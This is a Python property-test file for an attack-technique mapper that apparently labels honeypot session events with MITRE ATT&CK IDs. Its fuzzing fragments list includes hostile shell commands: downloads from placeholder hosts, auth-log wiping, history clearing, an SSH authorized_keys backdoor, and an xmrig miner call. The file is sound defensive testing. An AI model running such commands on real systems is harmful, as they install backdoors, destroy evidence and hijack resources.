"""Property tests for ``brain.analysis.attack_map`` (Property 8)."""

from __future__ import annotations

import json
from datetime import UTC, datetime

from hypothesis import given, settings
from hypothesis import strategies as st

from brain.analysis.attack_map import map_techniques
from brain.models import Event

ALLOWED_IDS = frozenset(
    {
        "T1110",
        "T1078",
        "T1082",
        "T1105",
        "T1059.004",
        "T1053.003",
        "T1496",
        "T1070.004",
        "T1098.004",
    }
)

_TS = datetime(2024, 1, 1, tzinfo=UTC)

_FRAGMENTS = st.sampled_from(
    [
        "uname -a",
        "whoami",
        "wget http://x.example:3333/a",
        "curl -O http://h/b",
        "crontab -e",
        "cat /etc/cron.d/x",
        "echo x > /var/log/auth.log",
        "rm -rf /var/log/x",
        "history -c",
        "echo k >> ~/.ssh/authorized_keys",
        "./xmrig --url stratum+tcp://p:4444",
        ";",
        "|",
        "&&",
        "'",
        '"',
        ">",
    ]
)
_text = st.one_of(st.text(max_size=60), st.lists(_FRAGMENTS, max_size=5).map(" ".join))


def _event(kind: str, payload: object) -> Event:
    body = payload if isinstance(payload, str) else json.dumps(payload)
    return Event(
        session_id="s",
        timestamp=_TS,
        kind=kind,
        payload=body,
        generated_by="scripted",
    )


_event_st = st.one_of(
    _text.map(lambda c: _event("command", {"command": c})),
    st.booleans().map(lambda ok: _event("login_attempt", {"success": ok})),
    _text.map(lambda u: _event("download_attempt", {"url": u})),
    _text.map(lambda raw: _event("command", raw)),  # arbitrary / non-JSON payloads
    st.sampled_from(["response", "session_start", "session_end"]).map(
        lambda k: _event(k, {})
    ),
)


@settings(max_examples=100, deadline=None)
@given(events=st.lists(_event_st, max_size=15))
def test_property_8_no_duplicates_and_deterministic(events: list[Event]) -> None:
    """Feature: brain, Property 8: Technique mapping is duplicate-free and deterministic.

    **Validates: Requirements 4.10, 4.11, 4.12**
    """
    first = map_techniques(events)
    second = map_techniques(events)
    ids = [h.attack_id for h in first]
    assert len(ids) == len(set(ids))
    assert first == second
    assert all(0 <= h.evidence_event_index < len(events) for h in first)


@settings(max_examples=200, deadline=None)
@given(command=st.text(max_size=300))
def test_property_8_arbitrary_command_text_is_safe(command: str) -> None:
    """Feature: brain, Property 8: arbitrary command text never raises; only allowed attack_ids.

    **Validates: Requirements 4.10, 4.12, 13.4**
    """
    events = [_event("command", {"command": command})]
    hits = map_techniques(events)
    assert {h.attack_id for h in hits} <= ALLOWED_IDS
    assert len({h.attack_id for h in hits}) == len(hits)
